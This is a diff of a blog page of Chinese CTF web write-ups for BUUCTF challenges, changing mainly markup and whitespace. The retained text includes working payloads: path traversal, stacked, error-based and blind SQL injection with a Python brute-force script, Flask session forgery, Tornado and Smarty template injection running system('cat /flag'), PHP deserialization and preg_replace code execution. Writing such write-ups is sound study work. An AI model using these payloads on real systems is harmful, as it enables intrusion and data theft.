@@ -472,18 +472,18 @@
           <h1 id="HCTF-2018-WarmUp"><a href="#HCTF-2018-WarmUp" class="headerlink" title="[HCTF 2018]WarmUp"></a>[HCTF 2018]WarmUp</h1><p>index源码注释叫我们直接访问source.php</p>
 <p>直接访问可得到源码</p>
 <p>看不懂抄一手</p>
-<pre><code class="php">
+<pre><code class="lang-php">
  &lt;?php
     highlight_file(__FILE__);
     class emmm
     &#123;
         public static function checkFile(&amp;$page) 
         //传入了变量page，也就是我们刚刚传进来的file
-            
+
         &#123;
             // 这里定义了白名单,包括source.php和hint.php
             $whitelist = [&quot;source&quot;=&gt;&quot;source.php&quot;,&quot;hint&quot;=&gt;&quot;hint.php&quot;];
-            
+
             if (! isset($page) || !is_string($page)) &#123;
             /*为了返回 true 两个条件必须满足
                 1 page存在 
@@ -492,7 +492,7 @@
                 echo &quot;you can&#39;t see it&quot;;
                 return false;
             &#125;
-            
+
             if (in_array($page, $whitelist)) &#123;
                 return true;
             &#125;
@@ -500,28 +500,28 @@
             白名单过滤，需要返回了ture
             所以这里我们传入的page或者是经过截断之后的page必须是soure.php或hint.php，
             这里是正常的访问，我们需要构造文件任意包含，所以这里传入的不满足条件，这里不是注意的点，往下继续看*/
-            
+
             $_page = mb_substr( 
                 $page,
                 0,
                 mb_strpos($page . &#39;?&#39;,  &#39;?&#39;)
             );
             /*这里mb_substr 是个截断，返回0到mb_strpos之间的内容，而mb_strpos 则是查找第一次出现的位置，所以基本可以理解为获取page 两个？之间的字符串，也就是获取file两个？之间的字符串，放到url中就是http://ip/?file=ddd?中的file=ddd*/    
-            
+
             if (in_array($_page, $whitelist)) &#123; 
                 return true;
             &#125;
             //这里和上面类似 查看_page 是否在白名单中
-            
+
             $_page = urldecode($page);  // 这里发现对_page进行了一次decode解码，
-            $_page = mb_substr(			//获取两个？？之间的内容
+            $_page = mb_substr(            //获取两个？？之间的内容
                 $_page,
                 0,
                 mb_strpos($_page . &#39;?&#39;, &#39;?&#39;)
             );
             //先进行url解码再截取，因此我们可以将?经过两次url编码，在服务器端提取参数时解码一次，checkFile函数中解码一次，仍会解码为&#39;?&#39;，仍可通过第四个if语句校验。（&#39;?&#39;两次编码值为&#39;%253f&#39;），构造url：
             // 这里是我们要绕过的点，从这里往上看 尝试构造
-            
+
             if (in_array($_page, $whitelist)) &#123;//白名单
                 return true;
             &#125;
@@ -547,27 +547,26 @@
 </code></pre>
 <p>考察代码审计，只要能通过checkFile函数就行，这里会获得俩??之间的字符串来判断，所以playload里面得有<code>?hint.php?</code>再然后不知道<code>ffffllllaaaagggg</code>在那个目录，就得路径穿越了，构造<code>../</code></p>
 <p>payload:</p>
-<pre><code class="txt">http://249c777a-c885-4ab3-bef4-4efb5270da80.node5.buuoj.cn:81/index.php?file=hint.php?../../../../../ffffllllaaaagggg
+<pre><code class="lang-txt">http://249c777a-c885-4ab3-bef4-4efb5270da80.node5.buuoj.cn:81/index.php?file=hint.php?../../../../../ffffllllaaaagggg
 </code></pre>
 <h1 id="SUCTF-2019-EasySQL"><a href="#SUCTF-2019-EasySQL" class="headerlink" title="[SUCTF 2019]EasySQL"></a>[SUCTF 2019]EasySQL</h1><p>sql注入题</p>
 <p>后端</p>
-<pre><code class="sql">select $_POST[&#39;query&#39;] || flag from Flag;
+<pre><code class="lang-sql">select $_POST[&#39;query&#39;] || flag from Flag;
 </code></pre>
 <p>payload</p>
-<pre><code class="sql">
+<pre><code class="lang-sql">
 1;select *,1
 </code></pre>
 <p>结果就成了</p>
-<pre><code class="sql">
+<pre><code class="lang-sql">
 select 1;select *,1 || flag from Flag;
-
 </code></pre>
 <p>导致堆叠注入输出flag</p>
 <p>或者设置<code>SQL_MOD</code></p>
 <blockquote>
 <p>SQL_MOD：是MySQL支持的基本语法、校验规则<br>其中PIPES_AS_CONCAT:会将||认为字符串的连接符，而不是或运算符，这时||符号就像concat函数一样。</p>
 </blockquote>
-<pre><code class="sql">
+<pre><code class="lang-sql">
 mysql&gt; set sql_mode=PIPES_AS_CONCAT;
 Query OK, 0 rows affected (0.00 sec)
 
@@ -589,59 +588,57 @@ mysql&gt; select &#39;a&#39; || &#39;flag&#39;;
 1 row in set (0.00 sec)
 </code></pre>
 <p>payload</p>
-<pre><code class="sql">1;set sql_mod=PIPES_AS_CONCAT;select 1
+<pre><code class="lang-sql">1;set sql_mod=PIPES_AS_CONCAT;select 1
 插入SQL语句就成为
 select concat(1,flag) from Flag;
 </code></pre>
 <h1 id="强网杯-2019-随便注"><a href="#强网杯-2019-随便注" class="headerlink" title="[强网杯 2019]随便注"></a>[强网杯 2019]随便注</h1><p>考察堆叠注入</p>
-<pre><code class="sql">
+<pre><code class="lang-sql">
 &#39;;show tables--+
-
 </code></pre>
 <p>得到表名</p>
-<pre><code class="sql">
+<pre><code class="lang-sql">
 &#39;;show columns from `1919810931114514`--+
 </code></pre>
 <p>得到flag字段</p>
 <p>最后</p>
-<pre><code class="sql">
+<pre><code class="lang-sql">
 1&#39;; handler `1919810931114514` open as `a`; handler `a` read next;#
 </code></pre>
 <p>handler</p>
-<pre><code class="txt">
+<pre><code class="lang-txt">
  mysql除可使用select查询表中的数据，也可使用handler语句，这条语句使我们能够一行一行的浏览一个表中的数据，不过handler语句并不具备select语句的所有功能。它是mysql专用的语句，并没有包含到SQL标准中。
 </code></pre>
-<pre><code class="sql">1 &#39;;handler (数据表)  open ;handler （数据表） read first;handler （数据表） close; % 23
+<pre><code class="lang-sql"> 1 &#39;;handler (数据表)  open ;handler （数据表） read first;handler （数据表） close; % 23
 </code></pre>
 <p>rename:</p>
 <p>修改一个或多个表的名称</p>
-<pre><code class="sql">RENAME TABLE old_table_name TO new_table_name;
+<pre><code class="lang-sql">RENAME TABLE old_table_name TO new_table_name;
 </code></pre>
 <p>alert:</p>
 <p>向表中添加字段</p>
-<pre><code class="sql">Alter table [表名] add [列名] 类型
+<pre><code class="lang-sql">Alter table [表名] add [列名] 类型
 </code></pre>
 <p>保留old和new列名</p>
 <pre><code>列名：a ----&gt;b 列类型
 　　　ALTER TABLE t1 CHANGE a b INTEGER;
+</code></pre><p>由于这道题没有禁用rename和alert，所以我们可以采用修改表结构的方法来得到flag 将words表名改为words1，再将数字名表（1919810931114514）改为words，这样数字名表就是默认查询的表了，但是它少了一个id列，可以将flag字段改为id，或者添加id字段</p>
+<pre><code class="lang-sql">1 %27;rename tables `words` to `words1`;rename tables `1919810931114514` to `words`; alter table `words` change `flag` `id` varchar(100);#
 </code></pre>
-<p>由于这道题没有禁用rename和alert，所以我们可以采用修改表结构的方法来得到flag 将words表名改为words1，再将数字名表（1919810931114514）改为words，这样数字名表就是默认查询的表了，但是它少了一个id列，可以将flag字段改为id，或者添加id字段</p>
-<pre><code class="sql">1 %27;rename tables `words` to `words1`;rename tables `1919810931114514` to `words`; alter table `words` change `flag` `id` varchar(100);#
-</code></pre>
-<h1 id="RoarCTF-2019-Easy-Calc"><a href="#RoarCTF-2019-Easy-Calc" class="headerlink" title="[RoarCTF 2019]Easy Calc"></a>[RoarCTF 2019]Easy Calc</h1><pre><code class="php">
-&lt;?php
+<h1 id="RoarCTF-2019-Easy-Calc"><a href="#RoarCTF-2019-Easy-Calc" class="headerlink" title="[RoarCTF 2019]Easy Calc"></a>[RoarCTF 2019]Easy Calc</h1><pre><code class="lang-php">
+ &lt;?php
 error_reporting(0);
 if(!isset($_GET[&#39;num&#39;]))&#123;
-   show_source(__FILE__);
+    show_source(__FILE__);
 &#125;else&#123;
-       $str = $_GET[&#39;num&#39;];
-       $blacklist = [&#39; &#39;, &#39;\t&#39;, &#39;\r&#39;, &#39;\n&#39;,&#39;\&#39;&#39;, &#39;&quot;&#39;, &#39;`&#39;, &#39;\[&#39;, &#39;\]&#39;,&#39;\$&#39;,&#39;\\&#39;,&#39;\^&#39;];
-       foreach ($blacklist as $blackitem) &#123;
-               if (preg_match(&#39;/&#39; . $blackitem . &#39;/m&#39;, $str)) &#123;
-                       die(&quot;what are you want to do?&quot;);
-               &#125;
-       &#125;
-       eval(&#39;echo &#39;.$str.&#39;;&#39;);
+        $str = $_GET[&#39;num&#39;];
+        $blacklist = [&#39; &#39;, &#39;\t&#39;, &#39;\r&#39;, &#39;\n&#39;,&#39;\&#39;&#39;, &#39;&quot;&#39;, &#39;`&#39;, &#39;\[&#39;, &#39;\]&#39;,&#39;\$&#39;,&#39;\\&#39;,&#39;\^&#39;];
+        foreach ($blacklist as $blackitem) &#123;
+                if (preg_match(&#39;/&#39; . $blackitem . &#39;/m&#39;, $str)) &#123;
+                        die(&quot;what are you want to do?&quot;);
+                &#125;
+        &#125;
+        eval(&#39;echo &#39;.$str.&#39;;&#39;);
 &#125;
 ?&gt;
 </code></pre>
@@ -649,7 +646,7 @@ if(!isset($_GET[&#39;num&#39;]))&#123;
 <p>利用php特性绕过：</p>
 <p><a href="https://www.cnblogs.com/sfsec/p/15205011.html">参考</a></p>
 <p>PHP的字符串解析特性</p>
-<p>我们知道PHP将查询字符串（在URL或正文中）转换为内部<code>$_GET</code>或的关联数组<code>$_POST</code>。例如：&#x2F;?foo&#x3D;bar变成Array([foo] &#x3D;&gt; “bar”)。值得注意的是，查询字符串在解析的过程中会将某些字符删除或用下划线代替。例如，<code>/?%20news[id%00=42</code>会转换为Array([news_id] &#x3D;&gt; 42)。如果一个IDS&#x2F;IPS或WAF中有一条规则是当news_id参数的值是一个非数字的值则拦截，那么我们就可以用以下语句绕过：</p>
+<p>我们知道PHP将查询字符串（在URL或正文中）转换为内部<code>$_GET</code>或的关联数组<code>$_POST</code>。例如：/?foo=bar变成Array([foo] =&gt; “bar”)。值得注意的是，查询字符串在解析的过程中会将某些字符删除或用下划线代替。例如，<code>/?%20news[id%00=42</code>会转换为Array([news_id] =&gt; 42)。如果一个IDS/IPS或WAF中有一条规则是当news_id参数的值是一个非数字的值则拦截，那么我们就可以用以下语句绕过：</p>
 <p><code>/news.php?%20news[id%00=42&quot;+AND+1=0–</code></p>
 <p>上述PHP语句的参数<code>%20news[id%00</code>的值将存储到<code>$_GET[“news_id”]</code>中。</p>
 <p>PHP需要将所有参数转换为有效的变量名，因此在解析查询字符串时，它会做两件事：</p>
@@ -661,7 +658,7 @@ if(!isset($_GET[&#39;num&#39;]))&#123;
 <p>列出根目录文件</p>
 <h2 id="scandir"><a href="#scandir" class="headerlink" title="scandir()"></a>scandir()</h2><p>列出目录中的文件和目录</p>
 <p>eg: <code>scandir(&#39;/&#39;)</code></p>
-<pre><code class="txt">
+<pre><code class="lang-txt">
 Array
 (
 [0] =&gt; .
@@ -682,33 +679,33 @@ Array
 )
 </code></pre>
 <p>读取文件</p>
-<pre><code class="url">var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))`
+<pre><code class="lang-url">var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))`
 </code></pre>
 <h2 id="var-dump"><a href="#var-dump" class="headerlink" title="var_dump()"></a>var_dump()</h2><p>标准打印数组</p>
 <h2 id="file-get-contents"><a href="#file-get-contents" class="headerlink" title="file_get_contents()"></a>file_get_contents()</h2><p>读取文件</p>
 <h1 id="HCTF-2018-admin"><a href="#HCTF-2018-admin" class="headerlink" title="[HCTF 2018]admin"></a>[HCTF 2018]admin</h1><p>flask session伪造</p>
 <p>可以从网页里翻出源码的，但是源码被删了</p>
 <p>有了源码就可以在<code>config.py</code>里面找到<code>secret_key</code>找到后就可以加解密了</p>
-<pre><code class="bash">PS E:\Desktop\ctf\flask-session-cookie-manager-master&gt; python39.exe .\flask_session_cookie_manager3.py decode -c .eJxFkMGKwkAMhl9lydlDO9WL4EEZt7SQKS5TS-Yiaqttp3GhKrYjvvsOLuwecvqS7-fPE3anvrrWML_192oCu6aE-RM-DjAHLBJhOAmQMTQxCnSGydFI-jylFgcS-ejZ4CfKJIWoKSB3jJTnKDFQWtlMf9ZKrx-oy4ZcPmbSjqbwjNPO8Jclt-ow3raZrjvUqxrllpXOIyOtUO0yNJIeRi4HciUrl8wwTgS5tch0EimZtqRX7HcX8JrA8dqfdrdvW13-Kwh_HiczYuX1-QyLzZDF20ZJFEr4mCJlZNMYnXZZsX6YtrS4XLx1De_P1Z8pt9PpYfNLLnv2APYlN5cQJnC_Vv37cRAG8PoBOrNsUg.Zh1BCg._LSyxZCqUDbr3zU2RkUofmHE5PM
+<pre><code class="lang-bash">PS E:\Desktop\ctf\flask-session-cookie-manager-master&gt; python39.exe .\flask_session_cookie_manager3.py decode -c .eJxFkMGKwkAMhl9lydlDO9WL4EEZt7SQKS5TS-Yiaqttp3GhKrYjvvsOLuwecvqS7-fPE3anvrrWML_192oCu6aE-RM-DjAHLBJhOAmQMTQxCnSGydFI-jylFgcS-ejZ4CfKJIWoKSB3jJTnKDFQWtlMf9ZKrx-oy4ZcPmbSjqbwjNPO8Jclt-ow3raZrjvUqxrllpXOIyOtUO0yNJIeRi4HciUrl8wwTgS5tch0EimZtqRX7HcX8JrA8dqfdrdvW13-Kwh_HiczYuX1-QyLzZDF20ZJFEr4mCJlZNMYnXZZsX6YtrS4XLx1De_P1Z8pt9PpYfNLLnv2APYlN5cQJnC_Vv37cRAG8PoBOrNsUg.Zh1BCg._LSyxZCqUDbr3zU2RkUofmHE5PM
 b&#39;&#123;&quot;_fresh&quot;:true,&quot;_id&quot;:&#123;&quot; b&quot;:&quot;MWI2ZmI0MmM1ZGM2MzZmYzYyYTg4YjMxY2UyMmMxMmM3ODY1MTY0Yzc3NTg4MDM0NTNkOTFhNTEwMTdiYzUyODkyZWM0NmJlZmRkYzBlMGVjOThlMTBhMDVmNTU3ZDk2NjA1ZDYwZDAxYzdmNzI5MGI2YzE2OTI3NDJjYTBmZDk=&quot;&#125;,&quot;csrf_token&quot;:&#123;&quot; b&quot;:&quot;M2YwZGI5YmNlMTU5MWQxOGViNDM2N2U3ZWJmMmZiZTJlOWEwZjdkMA==&quot;&#125;,&quot;image&quot;:&#123;&quot; b&quot;:&quot;Uk44bQ==&quot;&#125;,&quot;name&quot;:&quot;admin1&quot;,&quot;user_id&quot;:&quot;10&quot;&#125;&#39;
 </code></pre>
 <p>更改admin1为admin后就行<br>但是有一个很坑的点就是这里用的双引号，但是加密的时候得用单引号，所以要把双引号改成单引号后加密</p>
-<pre><code class="bash">
+<pre><code class="lang-bash">
 E:\Desktop\ctf\flask-session-cookie-manager-master&gt;python39.exe flask_session_cookie_manager3.py encode -s ckj123 -t &quot;&#123;&#39;_fresh&#39;: True, &#39;_id&#39;: b&#39;a964ffdf9ad843337371b754fe4dee5f513139037266dcff517e58e1
 e59fd05671c5370244ce3d91eb5b1c44857c213c8de30f4c6d3d604d0724863c8a99a6aa&#39;, &#39;csrf_token&#39;: b&#39;d1bffe11dbd467f7d2a1b79345789c2599b72276&#39;, &#39;image&#39;: b&#39;1JK4&#39;, &#39;name&#39;: &#39;admin&#39;, &#39;user_id&#39;: &#39;10&#39;&#125;&quot;
 .eJw9kE9vgkAQR79KM2cO_NELiQeaBWLSGaJZJLsXQhEtuyxtUFNZ43fvahMPc3rJy-_NDerD1J2-ID5Pl86Dut9DfIO3T4hBcB1SLo3MxVJUmwUxtGhbSzbryZa-NO7y3UCVCJDjFa3-dXwmJbUIpSGeRpKXC8mzgfhgJEsCUu1V2NI5kpnYVklOunBcqF2PFfrEjgGFOCMnVeTbAe27oRxDyUiTSnzniFC5LerB02VRpaGo0hXcPWhP06E-f-tufCVIlvUuYECeaWE2Pqm9oXAzC_5I0JZYGRVsUKhKp1o79Tqi4-qp601z7F4mLH8-KPknY2McgGZv-hE8uJy66fk3CHy4_wFvSmyb.Zh1Ggw.UpY4s73R-GH8qEUu6u1i8Ynd_X4
 </code></pre>
 <p>最不理解的一集</p>
 <h1 id="护网杯-2018-easy-tornado"><a href="#护网杯-2018-easy-tornado" class="headerlink" title="[护网杯 2018]easy_tornado"></a>[护网杯 2018]easy_tornado</h1><p>三个文件</p>
-<pre><code class="txt">
+<pre><code class="lang-txt">
 /flag.txt
 flag in /fllllllllllllag
- 
- 
+
+
 /welcome.txt
 render
- 
- 
+
+
 /hints.txt
 md5(cookie_secret+md5(filename))
 </code></pre>
@@ -717,12 +714,12 @@ md5(cookie_secret+md5(filename))
 <p>所以我们可以说handler.settings指向了RequestHandler.settings了，对吧</p>
 <p>这样我们就可以构造一下payload：<code>?msg=&#123;&#123;handler.settings&#125;&#125;</code></p>
 <p>于是获得cookie_secret:</p>
-<pre><code class="txt">
+<pre><code class="lang-txt">
 &#123;&#39;autoreload&#39;: True, &#39;compiled_template_cache&#39;: False, &#39;cookie_secret&#39;: &#39;66d79cfd-d1a2-4d07-a00a-a49d062befe7&#39;&#125;
 </code></pre>
 <h1 id="极客大挑战-2019-HardSQL"><a href="#极客大挑战-2019-HardSQL" class="headerlink" title="[极客大挑战 2019]HardSQL"></a>[极客大挑战 2019]HardSQL</h1><p>报错注入</p>
 <p>extractvalue</p>
-<pre><code class="sql">
+<pre><code class="lang-sql">
 &#39;admin &#39;^extractvalue(1,concat(0x5c,(select(database()))))%23
 
 extractvalue(1,concat(0x5c,(select(group_concat(table_name))from(information_schema.tables)where((table_schema)like(database()))),0x5c))%23
@@ -739,16 +736,15 @@ extractvalue(1,concat(0x5c,right((select(group_concat(password))from(H4rDsq1)),2
 </code></pre>
 <h1 id="GXYCTF-2019-BabySQli"><a href="#GXYCTF-2019-BabySQli" class="headerlink" title="[GXYCTF 2019]BabySQli"></a>[GXYCTF 2019]BabySQli</h1><p><a href="https://www.cnblogs.com/junlebao/p/13859371.html">参考</a></p>
 <p>先是测试，发现有waf，查看源码发现sql语句</p>
-<pre><code class="sql">
+<pre><code class="lang-sql">
 select * from user where username = &#39;$name&#39;
 </code></pre>
 <p>使用union联合注入，发现一共有三个位置</p>
-<p><img src="https://i0.hdslb.com/bfs/article/c8c699a1592252d8ce68be4449814b35290349942.png"></p>
+<p><img src="https://i0.hdslb.com/bfs/article/c8c699a1592252d8ce68be4449814b35290349942.png" alt=""></p>
 <p>当密码传入的是数组时发现报错，可以确定密码进行了md5加密，当把admin放在第二个位置时，发现提示密码错误，即可猜到三个位置分别为id,username,password<br>又知道当密码传入是数组时返回NULL，那么我们也可构造密码为NULL从而绕过登录</p>
 <p>payload</p>
 <pre><code>name=a&#39; union select 1,&#39;admin&#39;,NULL #&amp;pw[]=1
-</code></pre>
-<p><img src="https://i0.hdslb.com/bfs/article/20dd4dd4b96734f8d0ce7bee69f921f6290349942.png"></p>
+</code></pre><p><img src="https://i0.hdslb.com/bfs/article/20dd4dd4b96734f8d0ce7bee69f921f6290349942.png" alt=""></p>
 <h1 id="CISCN2019-华北赛区-Day2-Web1-Hack-World"><a href="#CISCN2019-华北赛区-Day2-Web1-Hack-World" class="headerlink" title="[CISCN2019 华北赛区 Day2 Web1]Hack World"></a>[CISCN2019 华北赛区 Day2 Web1]Hack World</h1><p>先bp爆破哪些关键字被过滤了</p>
 <pre><code>
 `
@@ -783,7 +779,7 @@ _
 &gt;
 /
 ?
- 
+
 --
 --+
 /**/
@@ -859,18 +855,17 @@ end
 then
 iconv
 greatest
-</code></pre>
-<p>再结合布尔盲注知识写payload</p>
-<pre><code class="sql">id=0^(ascii(substr((select(flag)from(flag)),2,1))&gt;0)
+</code></pre><p>再结合布尔盲注知识写payload</p>
+<pre><code class="lang-sql">id=0^(ascii(substr((select(flag)from(flag)),2,1))&gt;0)
 </code></pre>
 <p>脚本</p>
-<pre><code class="python">import requests
+<pre><code class="lang-python">import requests
 
 url = &quot;http://80ff8565-6961-45a6-9b90-dbb64f939008.node5.buuoj.cn:81/index.php&quot;
 for j in range(1,100):
     for i in range(128,32,-1):
         data=&#123;&quot;id&quot;:&quot;0^(ascii(substr((select(flag)from(flag)),&quot;+str(j)+&quot;,1))&gt;&quot;+str(i)+&quot;)&quot;&#125;
-        
+
         quest=requests.post(url,data)
         while(quest.status_code != 200):
             quest=requests.post(url,data)
@@ -878,8 +873,8 @@ for j in range(1,100):
             print (chr(i+1),end=&quot;&quot;)
             break
 </code></pre>
-<h1 id="RoarCTF-2019-Easy-Java"><a href="#RoarCTF-2019-Easy-Java" class="headerlink" title="[RoarCTF 2019]Easy Java"></a>[RoarCTF 2019]Easy Java</h1><p>点击help发现是文件下载，而且是java开发，把请求改成post(这里好像只能过猜)下载<code>WEB-INF/web.xml</code>造成源码泄露<br><img src="https://i0.hdslb.com/bfs/article/389f8bd3f3d9ba4fef6d428754519b55290349942.png"></p>
-<h1 id="网鼎杯-2018-Fakebook"><a href="#网鼎杯-2018-Fakebook" class="headerlink" title="[网鼎杯 2018]Fakebook"></a>[网鼎杯 2018]Fakebook</h1><p>扫目录发现&#x2F;robots.txt<br>发现备份文件</p>
+<h1 id="RoarCTF-2019-Easy-Java"><a href="#RoarCTF-2019-Easy-Java" class="headerlink" title="[RoarCTF 2019]Easy Java"></a>[RoarCTF 2019]Easy Java</h1><p>点击help发现是文件下载，而且是java开发，把请求改成post(这里好像只能过猜)下载<code>WEB-INF/web.xml</code>造成源码泄露<br><img src="https://i0.hdslb.com/bfs/article/389f8bd3f3d9ba4fef6d428754519b55290349942.png" alt=""></p>
+<h1 id="网鼎杯-2018-Fakebook"><a href="#网鼎杯-2018-Fakebook" class="headerlink" title="[网鼎杯 2018]Fakebook"></a>[网鼎杯 2018]Fakebook</h1><p>扫目录发现/robots.txt<br>发现备份文件</p>
 <pre><code>有一个UserInfo的类,类中有三个公共的类变量：name,age,blog。一个构造方法，一个get方法。主要的工作应该是建立会话，
 
 然后判断是否是有效的请求，如果不是则返回404，如果不是则返回url的内容，一个getBlogContents方法，返回一个url的内容
@@ -889,18 +884,15 @@ for j in range(1,100):
 get方法中，curl_exec()如果使用不当就会导致ssrf漏洞。有一点思路了，而我们在御剑扫到了flag.php。猜测可能flag.php处于内网，
 
 如果用ssrf访问flag.php，可以用伪协议`file://var/www/html/flag.php`访问。
-</code></pre>
-<p>后面就是正常的sql注入，数字型的，<code>union</code>被过滤了,绕过方法是<code>union/**/select</code></p>
+</code></pre><p>后面就是正常的sql注入，数字型的，<code>union</code>被过滤了,绕过方法是<code>union/**/select</code></p>
 <p>爆破出来是序列化字符串，把网页改成<code>file://var/www/html/flag.php</code>也可得到flag.php</p>
-<h1 id="BJDCTF2020-The-mystery-of-ip"><a href="#BJDCTF2020-The-mystery-of-ip" class="headerlink" title="[BJDCTF2020]The mystery of ip"></a>[BJDCTF2020]The mystery of ip</h1><p>提示表明要使用xff，但是我没想到考的是ssti<br><img src="https://i0.hdslb.com/bfs/article/2cb3cba3e0da84fece9499656a30b99a290349942.png"><br>根据报错发现是smarty模板</p>
+<h1 id="BJDCTF2020-The-mystery-of-ip"><a href="#BJDCTF2020-The-mystery-of-ip" class="headerlink" title="[BJDCTF2020]The mystery of ip"></a>[BJDCTF2020]The mystery of ip</h1><p>提示表明要使用xff，但是我没想到考的是ssti<br><img src="https://i0.hdslb.com/bfs/article/2cb3cba3e0da84fece9499656a30b99a290349942.png" alt=""><br>根据报错发现是smarty模板</p>
 <p><a href="https://www.freebuf.com/column/219913.html">参考</a></p>
 <p>没学，看wp发现可以直接命令执行</p>
 <pre><code>&#123;system(&#39;cat /flag&#39;)&#125;
-</code></pre>
-<h1 id="网鼎杯-2020-朱雀组-phpweb"><a href="#网鼎杯-2020-朱雀组-phpweb" class="headerlink" title="[网鼎杯 2020 朱雀组]phpweb"></a>[网鼎杯 2020 朱雀组]phpweb</h1><p>点进去看抓包，发现第一个参数是函数名，第二个参数是传参，用file_get_contents获取index.php</p>
+</code></pre><h1 id="网鼎杯-2020-朱雀组-phpweb"><a href="#网鼎杯-2020-朱雀组-phpweb" class="headerlink" title="[网鼎杯 2020 朱雀组]phpweb"></a>[网鼎杯 2020 朱雀组]phpweb</h1><p>点进去看抓包，发现第一个参数是函数名，第二个参数是传参，用file_get_contents获取index.php</p>
 <pre><code>func=file_get_contents&amp;p=index.php
-</code></pre>
-<p>获得源码</p>
+</code></pre><p>获得源码</p>
 <pre><code>&lt;?php
     $disable_fun = array(&quot;exec&quot;,&quot;shell_exec&quot;,&quot;system&quot;,&quot;passthru&quot;,&quot;proc_open&quot;,&quot;show_source&quot;,&quot;phpinfo&quot;,&quot;popen&quot;,&quot;dl&quot;,&quot;eval&quot;,&quot;proc_terminate&quot;,&quot;touch&quot;,&quot;escapeshellcmd&quot;,&quot;escapeshellarg&quot;,&quot;assert&quot;,&quot;substr_replace&quot;,&quot;call_user_func_array&quot;,&quot;call_user_func&quot;,&quot;array_filter&quot;, &quot;array_walk&quot;,  &quot;array_map&quot;,&quot;registregister_shutdown_function&quot;,&quot;register_tick_function&quot;,&quot;filter_var&quot;, &quot;filter_var_array&quot;, &quot;uasort&quot;, &quot;uksort&quot;, &quot;array_reduce&quot;,&quot;array_walk&quot;, &quot;array_walk_recursive&quot;,&quot;pcntl_exec&quot;,&quot;fopen&quot;,&quot;fwrite&quot;,&quot;file_put_contents&quot;);
     function gettime($func, $p) &#123;
@@ -931,9 +923,8 @@ get方法中，curl_exec()如果使用不当就会导致ssrf漏洞。有一点�
         &#125;
     &#125;
     ?&gt;
-</code></pre>
-<p>发现存在Test类，而且未过滤<code>unserialize</code>则可构造反序列化</p>
-<pre><code class="php">&lt;?php
+</code></pre><p>发现存在Test类，而且未过滤<code>unserialize</code>则可构造反序列化</p>
+<pre><code class="lang-php">&lt;?php
     class Test &#123;
         var $p = &quot;Y-m-d h:i:s a&quot;;
         var $func = &quot;date&quot;;
@@ -956,12 +947,10 @@ get方法中，curl_exec()如果使用不当就会导致ssrf漏洞。有一点�
 </code></pre>
 <h1 id="BSidesCF-2020-Had-a-bad-day"><a href="#BSidesCF-2020-Had-a-bad-day" class="headerlink" title="[BSidesCF 2020]Had a bad day"></a>[BSidesCF 2020]Had a bad day</h1><p>一开始以为是sql注入，当输入<code>&#39;</code>发现报错，得到是用include包含，那首先想到的就是伪协议</p>
 <pre><code>http://51e6cadc-a1f6-40fc-a058-77625ad16e17.node5.buuoj.cn:81/index.php?category=php://filter/convert.base64-encode/resource=index.php
-</code></pre>
-<p>发现报错</p>
+</code></pre><p>发现报错</p>
 <pre><code>
 Warning: include(php://filter/convert.base64-encode/resource=index.php.php): failed to open stream: operation failed in /var/www/html/index.php on line 37
-</code></pre>
-<p>多了一个<code>.php</code>那么去除<code>.php</code>即可得到源码</p>
+</code></pre><p>多了一个<code>.php</code>那么去除<code>.php</code>即可得到源码</p>
 <pre><code>&lt;?php
                 $file = $_GET[&#39;category&#39;];
 
@@ -975,12 +964,10 @@ Warning: include(php://filter/convert.base64-encode/resource=index.php.php): fai
                     &#125;
                 &#125;
                 ?&gt;
-</code></pre>
-<p>那么就得有index,woofers,meowers中一个，可以套一层即可得payload</p>
+</code></pre><p>那么就得有index,woofers,meowers中一个，可以套一层即可得payload</p>
 <pre><code>http://51e6cadc-a1f6-40fc-a058-77625ad16e17.node5.buuoj.cn:81/index.php?category=php://filter/convert.base64-encode/index/resource=flag
-</code></pre>
-<h1 id="BJDCTF2020-ZJCTF，不过如此"><a href="#BJDCTF2020-ZJCTF，不过如此" class="headerlink" title="[BJDCTF2020]ZJCTF，不过如此"></a>[BJDCTF2020]ZJCTF，不过如此</h1><p>preg_replace &#x2F;e 模式下的代码执行问题</p>
-<pre><code class="php">function complex($re, $str) &#123;
+</code></pre><h1 id="BJDCTF2020-ZJCTF，不过如此"><a href="#BJDCTF2020-ZJCTF，不过如此" class="headerlink" title="[BJDCTF2020]ZJCTF，不过如此"></a>[BJDCTF2020]ZJCTF，不过如此</h1><p>preg_replace /e 模式下的代码执行问题</p>
+<pre><code class="lang-php">function complex($re, $str) &#123;
     return preg_replace(&#39;/(&#39; . $re . &#39;)/ei&#39;,&#39;strtolower(&quot;\\1&quot;)&#39;,$str);
 &#125;
 
@@ -994,25 +981,23 @@ foreach($_GET as $re =&gt; $str) &#123;
 <pre><code>\S是什么意思？
 
 正则表达式\S匹配非空字符
-</code></pre>
-<p>payload ： <code>\S*=$&#123;getFlag()&#125;&amp;cmd=system(%27cat%20/flag%27);</code></p>
-<p>什么要匹配到<code> &#123;$&#123;phpinfo()&#125;&#125;</code> 或者 <code>$&#123;phpinfo()&#125;</code> ，才能执行 phpinfo 函数，这是一个小坑。这实际上是 PHP可变变量 的原因。在PHP中双引号包裹的字符串中可以解析变量，而单引号则不行。<code> $&#123;phpinfo()&#125;</code> 中的 <code>phpinfo()</code> 会被当做变量先执行，执行后，即变成 <code>$&#123;1&#125;</code> (phpinfo()成功执行返回true)。</p>
+</code></pre><p>payload ： <code>\S*=$&#123;getFlag()&#125;&amp;cmd=system(%27cat%20/flag%27);</code></p>
+<p>什么要匹配到<code>&#123;$&#123;phpinfo()&#125;&#125;</code> 或者 <code>$&#123;phpinfo()&#125;</code> ，才能执行 phpinfo 函数，这是一个小坑。这实际上是 PHP可变变量 的原因。在PHP中双引号包裹的字符串中可以解析变量，而单引号则不行。<code>$&#123;phpinfo()&#125;</code> 中的 <code>phpinfo()</code> 会被当做变量先执行，执行后，即变成 <code>$&#123;1&#125;</code> (phpinfo()成功执行返回true)。</p>
 <h1 id="BUUCTF-2018-Online-Tool"><a href="#BUUCTF-2018-Online-Tool" class="headerlink" title="[BUUCTF 2018]Online Tool"></a>[BUUCTF 2018]Online Tool</h1><p>escapeshellarg() 将给字符串增加一个单引号并且能引用或者转义任何已经存在的单引号，这样以确保能够直接将一个字符串传入 shell 函数，并且还是确保安全的</p>
 <p>escapeshellcmd() 对字符串中可能会欺骗 shell 命令执行任意命令的字符进行转义。 此函数保证用户输入的数据在传送到 exec() 或 system() 函数，或者 执行操作符 之前进行转义。</p>
